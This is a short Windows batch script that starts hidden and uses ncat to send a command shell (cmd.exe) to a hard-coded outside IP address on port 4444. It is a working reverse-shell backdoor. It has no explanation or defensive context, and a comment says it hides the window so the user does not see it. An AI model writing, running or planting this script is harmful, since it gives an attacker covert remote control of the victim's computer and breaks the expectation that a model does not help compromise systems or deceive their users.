@echo off
:: Hide the command prompt window
start /min cmd /c "%~dp0ncat.exe 105.127.9.248 4444 -e cmd.exe"
exit